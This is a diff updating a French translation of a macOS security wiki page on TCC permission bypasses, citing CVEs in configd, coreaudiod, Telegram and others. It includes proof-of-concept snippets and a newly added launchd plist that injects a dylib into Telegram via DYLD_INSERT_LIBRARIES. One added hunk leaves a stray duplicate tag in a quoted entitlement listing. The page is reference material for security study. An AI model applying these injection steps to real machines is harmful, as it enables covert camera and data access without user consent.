@@ -50,11 +50,11 @@ Par conséquent, un utilisateur pourrait **enregistrer une application malveilla
 
 ### iCloud
 
-Avec l'entitlement **`com.apple.private.icloud-account-access`**, il est possible de communiquer avec le service XPC **`com.apple.iCloudHelper`** qui **fournira des jetons iCloud**.
+Avec l'autorisation **`com.apple.private.icloud-account-access`**, il est possible de communiquer avec le service XPC **`com.apple.iCloudHelper`** qui **fournira des jetons iCloud**.
 
-**iMovie** et **Garageband** avaient cet entitlement et d'autres qui le permettaient.
+**iMovie** et **Garageband** avaient cette autorisation et d'autres qui le permettaient.
 
-Pour plus d'**informations** sur l'exploit pour **obtenir des jetons iCloud** à partir de cet entitlement, consultez la présentation : [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Pour plus d'**informations** sur l'exploitation pour **obtenir des jetons iCloud** à partir de cette autorisation, consultez la présentation : [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automation
 
@@ -110,7 +110,7 @@ Le démon **tccd** de l'espace utilisateur utilise la variable d'environnement *
 
 Selon [cette publication sur Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) et parce que le démon TCC s'exécute via `launchd` dans le domaine de l'utilisateur actuel, il est possible de **contrôler toutes les variables d'environnement** qui lui sont transmises.\
 Ainsi, un **attaquant pourrait définir la variable d'environnement `$HOME`** dans **`launchctl`** pour pointer vers un **répertoire contrôlé**, **redémarrer** le démon **TCC**, puis **modifier directement la base de données TCC** pour s'attribuer **tous les privilèges TCC disponibles** sans jamais demander l'autorisation à l'utilisateur final.\
-Preuve de concept (PoC) :
+PoC :
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -182,7 +182,7 @@ TCC utilise une base de données dans le dossier HOME de l'utilisateur pour cont
 Par conséquent, si l'utilisateur parvient à redémarrer TCC avec une variable d'environnement $HOME pointant vers un **dossier différent**, l'utilisateur peut créer une nouvelle base de données TCC dans **/Library/Application Support/com.apple.TCC/TCC.db** et tromper TCC pour accorder n'importe quelle permission TCC à n'importe quelle application.
 
 {% hint style="success" %}
-Notez qu'Apple utilise le paramètre stocké dans le profil de l'utilisateur dans l'attribut **`NFSHomeDirectory`** pour la valeur de `$HOME`, donc si vous compromettez une application avec des autorisations pour modifier cette valeur (`kTCCServiceSystemPolicySysAdminFiles`), vous pouvez **exploiter** cette option avec une contournement de TCC.
+Notez qu'Apple utilise le paramètre stocké dans le profil de l'utilisateur dans l'attribut **`NFSHomeDirectory`** pour la valeur de `$HOME`, donc si vous compromettez une application avec des autorisations pour modifier cette valeur (**`kTCCServiceSystemPolicySysAdminFiles`**), vous pouvez **exploiter** cette option avec une contournement de TCC.
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -200,7 +200,7 @@ Le **premier POC** utilise [**dsexport**](https://www.unix.com/man-page/osx/1/ds
 5. Importez l'entrée des services de répertoire modifiée avec [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
 6. Arrêtez le processus _tccd_ de l'utilisateur et redémarrez-le.
 
-Le deuxième POC utilisait **`/usr/libexec/configd`** qui avait `com.apple.private.tcc.allow` avec la valeur **`kTCCServiceSystemPolicySysAdminFiles`**.\
+Le deuxième POC utilisait **`/usr/libexec/configd`** qui avait `com.apple.private.tcc.allow` avec la valeur `kTCCServiceSystemPolicySysAdminFiles`.\
 Il était possible d'exécuter **`configd`** avec l'option **`-t`**, un attaquant pouvait spécifier un **Bundle personnalisé à charger**. Par conséquent, l'exploit **remplace** la méthode **`dsexport`** et **`dsimport`** de modification du répertoire principal de l'utilisateur par une **injection de code dans `configd`**.
 
 Pour plus d'informations, consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
@@ -226,9 +226,9 @@ Pour plus d'informations, consultez le [**rapport original**](https://wojciechre
 
 ### CVE-2020-29621 - Coreaudiod
 
-Le binaire **`/usr/sbin/coreaudiod`** avait les entitlements `com.apple.security.cs.disable-library-validation` et `com.apple.private.tcc.manager`. Le premier **permettait l'injection de code** et le second lui donnait accès à **la gestion de TCC**.
+Le binaire **`/usr/sbin/coreaudiod`** avait les entitlements `com.apple.security.cs.disable-library-validation` et `com.apple.private.tcc.manager`. Le premier permettait l'injection de code et le second lui donnait accès à la **gestion de TCC**.
 
-Ce binaire permettait de charger des **plug-ins tiers** à partir du dossier `/Library/Audio/Plug-Ins/HAL`. Par conséquent, il était possible de **charger un plugin et d'exploiter les permissions TCC** avec ce PoC :
+Ce binaire permettait de charger des **plug-ins tiers** à partir du dossier `/Library/Audio/Plug-Ins/HAL`. Par conséquent, il était possible de **charger un plugin et d'exploiter les permissions TCC** avec ce POC :
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -257,7 +257,7 @@ exit(0);
 ```
 Pour plus d'informations, consultez le [**rapport original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
 
-### Plug-ins de la couche d'abstraction du périphérique (DAL)
+### Plug-ins de la couche d'abstraction des périphériques (DAL)
 
 Les applications système qui ouvrent un flux de caméra via Core Media I/O (applications avec **`kTCCServiceCamera`**) chargent **dans le processus ces plug-ins** situés dans `/Library/CoreMediaIO/Plug-Ins/DAL` (non restreints par SIP).
 
@@ -267,7 +267,7 @@ Plusieurs applications Apple étaient vulnérables à cela.
 
 ### Firefox
 
-L'application Firefox est toujours vulnérable si elle possède l'autorisation `com.apple.security.cs.disable-library-validation`:
+L'application Firefox avait les autorisations `com.apple.security.cs.disable-library-validation` et `com.apple.security.cs.allow-dyld-environment-variables`:
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -279,6 +279,8 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
 <true/>
 <key>com.apple.security.cs.disable-library-validation</key>
+<true/>
+<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
 <true/>
 <key>com.apple.security.device.audio-input</key>
 <true/>
@@ -299,15 +301,45 @@ Le binaire `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` avait les 
 
 ### CVE-2023-26818 - Telegram
 
-Telegram avait les autorisations `com.apple.security.cs.allow-dyld-environment-variables` et `com.apple.security.cs.disable-library-validation`, il était donc possible de les exploiter pour **accéder à ses permissions**, comme l'enregistrement avec la caméra. Vous pouvez [**trouver la charge utile dans l'article**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+Telegram avait les autorisations **`com.apple.security.cs.allow-dyld-environment-variables`** et **`com.apple.security.cs.disable-library-validation`**, il était donc possible de l'exploiter pour **accéder à ses permissions**, comme l'enregistrement avec la caméra. Vous pouvez [**trouver la charge utile dans l'article**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
+Notez comment utiliser la variable d'environnement pour charger une bibliothèque, un **plist personnalisé** a été créé pour injecter cette bibliothèque et **`launchctl`** a été utilisé pour la lancer :
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.telegram.launcher</string>
+<key>RunAtLoad</key>
+<true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>DYLD_INSERT_LIBRARIES</key>
+<string>/tmp/telegram.dylib</string>
+</dict>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
+</array>
+<key>StandardOutPath</key>
+<string>/tmp/telegram.log</string>
+<key>StandardErrorPath</key>
+<string>/tmp/telegram.log</string>
+</dict>
+</plist>
+```
+
+```bash
+launchctl load com.telegram.launcher.plist
+```
 ## Par des invocations ouvertes
 
-Il est possible d'invoquer **`open`** même lorsque le sandbox est activé&#x20;
+Il est possible d'invoquer **`open`** même lorsque le sandbox est activé.
 
 ### Scripts Terminal
 
-Il est assez courant de donner un **Accès complet au disque (FDA)** au terminal, du moins sur les ordinateurs utilisés par les personnes techniques. Et il est possible d'invoquer des scripts **`.terminal`** en l'utilisant.
+Il est assez courant de donner un **Accès complet au disque (FDA)** au terminal, du moins sur les ordinateurs utilisés par des personnes techniques. Et il est possible d'invoquer des scripts **`.terminal`** en l'utilisant.
 
 Les scripts **`.terminal`** sont des fichiers plist comme celui-ci avec la commande à exécuter dans la clé **`CommandString`**:
 ```xml
